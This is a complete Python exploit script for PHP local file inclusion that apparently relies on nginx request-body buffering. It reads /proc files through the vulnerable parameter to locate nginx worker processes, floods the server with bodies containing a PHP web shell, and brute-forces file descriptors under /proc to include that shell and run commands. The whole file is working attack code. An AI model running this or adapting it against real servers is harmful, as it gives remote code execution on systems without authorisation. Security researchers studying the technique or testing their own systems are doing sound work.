#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx assistance (client body buffering)
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'

# find nginx worker processes
r  = requests.get(URL, params={
    'file': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    'file': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'file': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                'file': f,
                'c': f'id'
            })
            if r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
